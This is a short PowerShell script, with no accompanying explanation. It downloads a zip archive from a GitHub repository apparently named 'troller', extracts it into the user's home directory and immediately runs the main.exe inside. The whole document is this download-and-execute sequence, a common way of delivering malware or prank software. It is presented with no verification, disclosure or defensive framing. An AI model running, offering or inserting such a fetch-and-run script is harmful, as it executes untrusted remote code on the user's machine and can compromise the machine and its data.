cd $home
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/boatinalamp/troller/main/main.zip" -OutFile "main.zip"
Expand-Archive main.zip -DestinationPath main
cd main
.\main.exe